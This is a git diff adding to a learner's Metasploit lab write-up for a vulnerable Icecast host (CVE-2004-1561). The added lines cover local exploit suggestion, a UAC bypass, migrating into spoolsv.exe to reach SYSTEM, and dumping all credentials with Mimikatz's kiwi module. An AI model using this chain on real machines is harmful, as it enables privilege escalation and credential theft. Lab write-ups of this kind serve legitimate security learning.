@@ -132,6 +132,7 @@ Nmap done: 1 IP address (1 host up) scanned in 601.89 seconds
 
 # VULNERABLE to CVE-2004-1561
 > exploited by metasploit
+> search icecast
 > sysinfo to see the system info
 > Metasploit Local Exploit Suggester, or Lester for short. Lester is a post module that you can use to check a system for local vulnerabilities, [[ run post/multi/recon/local_exploit_suggester ]]
 > `run post/multi/recon/local_exploit_suggester
@@ -149,4 +150,19 @@ Nmap done: 1 IP address (1 host up) scanned in 601.89 seconds
 `
 > we ran exploit/windows/local/bypassuac_eventvwr
 > [[ getprivs ]] to check for privileges
-> TO BE CONTINUED.....
+> now we gained more privileges to migrate to processes and stuff
+> using ps we saw NT AUTHORITY processes so that we can migrate to them
+> 1268  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM
+> C:\Windows\System32\spoolsv.exe
+> migrate -N spoolsv.exe
+> meterpreter > getuid
+> Server username: NT AUTHORITY\SYSTEM
+> after becoming NT AUTHORITY\SYSTEM we can now see every user's password
+> so we used a program to dump all the passwords and the program is Mimikatz
+> [[ load kiwi ]] => [[ creds_all ]] to see all the creditionals
+
+
+
+===================================================================
+# Was fun learned alot !!!!
+===================================================================
